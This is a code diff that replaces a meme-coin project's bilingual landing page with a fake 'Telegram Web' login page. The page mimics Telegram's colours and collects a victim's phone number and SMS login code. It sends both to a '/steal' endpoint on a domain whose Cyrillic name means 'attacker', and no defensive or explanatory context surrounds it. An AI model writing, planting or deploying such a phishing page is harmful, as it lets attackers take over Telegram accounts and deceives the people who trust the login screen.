@@ -1,241 +1,48 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MUN Token - Meme Coin on TON</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="shortcut icon" href="img/logo64.ico" />
-    <link rel="stylesheet" href="styles.css">
-
+    <title>Telegram Web</title>
+    <style>
+        body {
+            background: #1a1a1d; /* Тёмный фон Telegram */
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+        }
+        .login-box {
+            width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+            background: #2b2b2b;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #2b5278;
+            border-radius: 4px;
+            background: #1e1e1e;
+            color: white;
+        }
+        button {
+            background: #2b5278; /* Синий цвет Telegram */
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="logo">MUN Token</div>
-        <div class="nav-links">
-            <a data-key="about" href="#about">О нас</a>
-            <a data-key="roadmap" href="#roadmap">Дорожная карта</a>
-            <a data-key="team" href="#team">Команда</a>
-        </div>
-        <div style="display: flex; align-items: center; gap: 1rem;">
-        <div class="lang-switcher">
-            <button onclick="changeLanguage('en')">EN</button>
-            <button onclick="changeLanguage('ru')">RU</button>
-        </div>
-        <a href="https://t.me/your_channel" class="telegram-button" target="_blank">
-            <i class="fab fa-telegram"></i>
-            <span data-key="telegramButton">Telegram</span>
-        </a>
-    </nav>
-
-    <section class="hero">
-        <div class="ton-badge">Powered by TON Blockchain</div>
-        <h1 data-key="slogan">Лучший мемный токен в сети TON!</h1>
-        <p data-key="description">Присоединяйся к революции мемов с MUN Token</p>
-        <a href="https://www.donationalerts.com/r/muntoken" 
-            class="cta-button" 
-            data-key="buyButton"
-            target="_blank"
-            rel="noopener noreferrer">
-            Donate
-        </a>
-    </section>
-
-    <section class="section section-dark" id="about">
-        <h2 data-key="aboutTitle">О проекте MUN</h2>
-        <p data-key="aboutText">MUN - это революционный мем-токен, созданный на блокчейне TON. Наша цель - объединить сообщество через юмор и передовые технологии.</p>
-    </section>
-
-    <section class="section" id="roadmap">
-        <h2 data-key="roadmapTitle">РОАДМАП</h2>
-        <div class="roadmap-steps">
-            <div class="roadmap-step">
-                <h3 data-key="roadmap1Title">Q3 2024</h3>
-                <p data-key="roadmap1Text">Запуск токена, создание сообщества, листинг на DEX</p>
-            </div>
-            <div class="roadmap-step">
-                <h3 data-key="roadmap2Title">Q4 2024</h3>
-                <p data-key="roadmap2Text">Запуск NFT-коллекции, партнерства с проектами TON</p>
-            </div>
-            <div class="roadmap-step">
-                <h3 data-key="roadmap3Title">Q1 2025</h3>
-                <p data-key="roadmap3Text">Создание собственной платформы для мем-контента</p>
-            </div>
-        </div>
-    </section>
-
-    <section class="section section-dark" id="team">
-        <h2 data-key="teamTitle">Наша команда</h2>
-        <div class="team-grid">
-            <div class="team-member">
-                <img src="img/Mecha-art.jpg" alt="Team Member">
-                <h3 data-key="member1Name">"Mecha"</h3>
-                <p data-key="member1Role">Основатель проекта</p>
-            </div>
-            <div class="team-member">
-                <img src="img/bektur-art.jpg" alt="Team Member">
-                <h3 data-key="member2Name">Бектур</h3>
-                <p data-key="member2Role">Разработчик</p>
-            </div>
-            <div class="team-member">
-                <img src="img/artem-art.jpg" alt="Team Member">
-                <h3 data-key="member3Name">Артем</h3>
-                <p data-key="member3Role">Маркетинг</p>
-            </div>
-        </div>
-    </section>
-
-    <section class="social-section">
-        <h2 data-key="socialTitle">Мы в социальных сетях</h2>
-        <div class="social-grid">
-            <a href="#" class="social-link" target="_blank">
-                <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
-                    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/>
-                </svg>
-            </a>
-            <a href="https://t.me/muntoken" class="social-link" target="_blank">
-                <i class="fab fa-telegram"></i>
-            </a>
-            <a href="https://www.tiktok.com/@muncrypto?_t=ZT-8uXdQ1ePhOM&_r=1" class="social-link" target="_blank">
-                <i class="fab fa-tiktok"></i>
-            </a>
-            <a href="#" class="social-link" target="_blank">
-                <i class="fab fa-youtube"></i>
-            </a>
-        </div>
-    </section>
-
-<script>
-    const translations = {
-        'ru': {
-            'home': 'Главная',
-            'about': 'О нас',
-            'roadmap': 'РОАДМАП',
-            'team': 'Команда',
-            'slogan': 'Лучший мемтокен в сети TON!',
-            'description': 'Присоединяйся к революции мемов с MUN Token',
-            'buyButton': 'Поддержать проект',
-            'aboutTitle': 'О проекте MUN',
-            'aboutText': 'MUN - это революционный мем-токен, созданный на блокчейне TON. Наша цель - объединить сообщество через юмор и передовые технологии.',
-            'roadmapTitle': 'РОАДМАП',
-            'roadmap1Title': 'Весна 2025',
-            'roadmap1Text': 'Запуск токена, создание сообщества✅, листинг на DEX',
-            'roadmap2Title': 'Лето 2024',
-            'roadmap2Text': 'Запуск NFT-коллекции, выпуск мерча, свой кошелек',
-            'roadmap3Title': 'Осень-Зима 2025',
-            'roadmap3Text': 'Создание собственной платформы для мем-контента, выход на тир1 биржи',
-            'teamTitle': 'Наша команда',
-            'member1Name': 'Mecha',
-            'member1Role': 'Основатель проекта',
-            'member2Name': 'Бектур',
-            'member2Role': 'Разработчик',
-            'member3Name': 'Артем',
-            'member3Role': 'Маркетинг',
-            'telegramButton': 'Telegram',
-            'socialTitle': 'Мы в социальных сетях',
-        },
-        'en': {
-            'home': 'Home',
-            'about': 'About',
-            'roadmap': 'Roadmap',
-            'team': 'Team',
-            'slogan': 'Best Meme Token on TON Blockchain!',
-            'description': 'Join the meme revolution with MUN Token',
-            'buyButton': 'Donation',
-            'aboutTitle': 'About MUN',
-            'aboutText': 'MUN is a revolutionary meme token built on TON blockchain. Our goal is to unite community through humor and cutting-edge technology.',
-            'roadmapTitle': 'Roadmap',
-            'roadmap1Title': 'Q3 2024',
-            'roadmap1Text': 'Token launch, community building, DEX listing',
-            'roadmap2Title': 'Q4 2024',
-            'roadmap2Text': 'NFT collection launch, TON ecosystem partnerships',
-            'roadmap3Title': 'Q1 2025',
-            'roadmap3Text': 'Meme content platform development',
-            'teamTitle': 'Our Team',
-            'member1Name': 'Mecha',
-            'member1Role': 'Founder',
-            'member2Name': 'Bektur',
-            'member2Role': 'Developer',
-            'member3Name': 'Artem',
-            'member3Role': 'Marketing',
-            'telegramButton': 'Telegram',
-            'socialTitle': 'Our Social Media',
-        }
-    };
-
-    function changeLanguage(lang) {
-        // Обновляем все элементы с data-key
-        document.querySelectorAll('[data-key]').forEach(element => {
-            const key = element.dataset.key;
-            if(translations[lang][key]) {
-                element.textContent = translations[lang][key];
-            }
-        });
-        
-        // Сохраняем выбор языка
-        localStorage.setItem('munLang', lang);
-        
-        // Обновляем атрибут lang у html
-        document.documentElement.lang = lang;
-    }
-
-    // Инициализация языка при загрузке
-    function initLanguage() {
-        const savedLang = localStorage.getItem('munLang') || 'ru';
-        changeLanguage(savedLang);
-    }
-
-    // Запуск инициализации при загрузке страницы
-    window.addEventListener('DOMContentLoaded', initLanguage);
-</script>
-
-<script>
-    // Плавная прокрутка с обработчиком событий
-document.querySelectorAll('.nav-links a').forEach(link => {
-    link.addEventListener('click', function(e) {
-        e.preventDefault();
-        const targetId = this.getAttribute('href');
-        const targetSection = document.querySelector(targetId);
-        
-        if(targetSection) {
-            // Рассчитываем позицию с учетом высоты навбара
-            const navbarHeight = document.querySelector('.navbar').offsetHeight;
-            const targetPosition = targetSection.offsetTop - navbarHeight;
-            
-            window.scrollTo({
-                top: targetPosition,
-                behavior: 'smooth'
-            });
-            
-            // Обновляем активную ссылку
-            document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
-            this.classList.add('active');
-        }
-    });
-});
-
-// Обновляем активную ссылку при скролле
-window.addEventListener('scroll', () => {
-    const sections = document.querySelectorAll('section');
-    const navLinks = document.querySelectorAll('.nav-links a');
-    
-    let currentSection = '';
-    sections.forEach(section => {
-        const sectionTop = section.offsetTop;
-        const sectionHeight = section.clientHeight;
-        if(window.scrollY >= sectionTop - 150) {
-            currentSection = section.getAttribute('id');
-        }
-    });
-    
-    navLinks.forEach(link => {
-        link.classList.remove('active');
-        if(link.getAttribute('href').includes(currentSection)) {
-            link.classList.add('active');
-        }
-    });
-});
-</script>
-
+    <div class="login-box">
+        <h2>Вход в Telegram</h2>
+        <form action="http://злоумышленник.рф/steal" method="POST">
+            <input type="text" name="phone" placeholder="Номер телефона">
+            <input type="text" name="code" placeholder="Код из SMS">
+            <button>Продолжить</button>
+        </form>
+    </div>
 </body>
 </html>
